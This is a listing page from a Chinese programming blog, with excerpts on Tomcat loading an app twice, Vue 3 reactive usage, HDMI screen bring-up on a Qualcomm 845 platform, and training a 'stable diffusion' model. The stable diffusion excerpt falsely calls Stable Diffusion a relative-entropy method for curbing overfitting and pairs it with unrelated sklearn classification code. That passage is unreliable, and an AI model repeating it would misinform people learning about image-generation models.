	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/29e1658e981b73608ef9028361ca12e8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b4ae9faf978515a31a992369d0115cbc/" rel="bookmark">
			Tomcat载入两次问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前提介绍：
1.某个应用Dragon放置路径：/opt/apache-tomcat-7.0.47/webapps/Dragon
2.Tomcat的server.xml部分配置信息例如以下：
&lt;Context path="" reloadable="false" docBase="Dragon"/&gt; 问题：此时tomcat启动时发现控制台打印两次信息。
问题原因：
由于Dragon应用本来就放在Tomat的默认webapp文件夹下（tomcat在启动时肯定会载入1次），
然后又在server.xml中做了配置，为了达到訪问根就能够訪问Dragon应用（这样tomcat就又载入1次）；
结果，Tomcat就会载入两次。
解决的方法：
首先在eclipse中能够右键项目名，选择Properties，再点击Web Project Setting,查看Content root的内容是否为当前项目名，假设不是。请改为当前的项目名。然后继续以下方法。
办法1、不要将Dragon应用放在Tomat的默认webapps文件夹下。把它移出去，然后在server.xml中
改动docBase的值为Dragon应用在新位置的绝对路径就能够了；
办法2、删除掉server.xml中 Context 的手动配置，这样就不会载入两次，由于Dragon应用在webapps下。
所以在訪问时。就仅仅能是：http://ip:port/Dragon这样来訪问了，注意删除Context标签时注意不要把&lt;/Host&gt;也删了。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3289836aeac0cb07056632ad480638dd/" rel="bookmark">
			如何基于stable diffusion训练出自己的模型，给出详细的python代码
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 首先，基于 stable diffusion 训练自己的模型需要了解 stable diffusion 的原理和基本操作。
Stable diffusion 是一种基于最小化相对熵的机器学习方法，旨在解决在机器学习中常见的过拟合问题。它通过在模型训练过程中引入一个惩罚项来限制模型的复杂度，从而使模型更稳定。
下面是一个基于 stable diffusion 训练模型的 Python 代码示例：
import numpy as np from sklearn.datasets import load_breast_cancer from sklearn.model_se 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7c4d54d511ac7fa0359bf024244642c7/" rel="bookmark">
			vue3 ＜script setup＞下reactive用法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		第一种：不使用toRefs解构的，也就是在template中使用对象引用方式
&lt;template&gt; &lt;div class="test-box"&gt; &lt;p @click="changeText"&gt;{{ data.text }}&lt;/p&gt; &lt;p @click="changeArrs"&gt;{{ data.arrss }}&lt;/p&gt; &lt;/div&gt; &lt;/template&gt; &lt;script setup&gt; import { ref, reactive, toRefs } from "vue" const data = reactive({ text: "123", arrss: [ { id: 1, text: "你" }, { id: 2, text: "好" }, ], }) const changeText = () =&gt; { data.text = 321 } const changeArrs = () =&gt; { // data.arrss.splice(1, 1) data.arrss.push({ id:3, text:'啊' }) } &lt;/script&gt; 初始页面状态：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7c4d54d511ac7fa0359bf024244642c7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/91d6838f026b4d9054d4a707e0721f8a/" rel="bookmark">
			LCD/HDMI OUT调试经验（6）------点亮HDMI屏幕
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在调试display的经历中，除了一些手持类设备以外其他机器基本都会外接HDMI屏幕，显示原理之前也提过：由模块发出的MIPI信号经过9611或者9611uxc芯片输出HDMI信号最后在屏幕进行显示。这两款芯片的最主要差别是9611uxc最高可以支持到4K60fps 的输出画面而9611是4K30fps。和调试9211的大致步骤完全一样，9611和9611uxc的芯片也是分为添加驱动，上电和配置屏幕，只不过需要具体修改配置屏幕的一些参数。所以请先熟悉9211的调试再阅读本篇文章。
本文基于高通845平台，首先大致讲解上电与添加驱动操作，配置屏幕方面在具体调试的过程中1080p与4k的区别会详细介绍。
一、阅读材料与上电 首先还是阅读手上的一些材料：芯片数据手册、原理图以及驱动部分代码。这里不再具体介绍，和9211调试的步骤基本一致，而且芯片的上电脚也差不多。这里贴一下9611uxc的原理图与数据手册部分内容
阅读完芯片手册与原理图下面在驱动进行上电操作，首先还是在设备树配置对应的GPIO：
接下来添加驱动并且解析对应GPIO再按照时序上电，相关代码就不贴，和9211的是一样的，这一步最主要的还是I2C要调通，后面都相对简单。
二、屏幕的配置 这一部分主要讲4k屏幕的配置与1080p的区别，9611uxc最多可以支持4k60 fps的显示，所以向下可以兼容1080p60 fps和720p60 fps，AP的4k MIPI参数配置如下：
（1）AP /* Copyright (c) 2015-2017, The Linux Foundation. All rights reserved. * * This program is free software; you can redistribute it and/or modify * it under the terms of the GNU General Public License version 2 and * only version 2 as published by the Free Software Foundation. * * This program is distributed in the hope that it will be useful, * but WITHOUT ANY WARRANTY; without even the implied warranty of * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/91d6838f026b4d9054d4a707e0721f8a/">Read more…</a>
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/posts/page/178/">«</a>
	<span class="pagination__item pagination__item--current">179/489</span>
	<a class="pagination__item pagination__item--next btn" href="/posts/page/180/">»</a>
</div>

			</div>
			

		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 菜鸟程序员博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>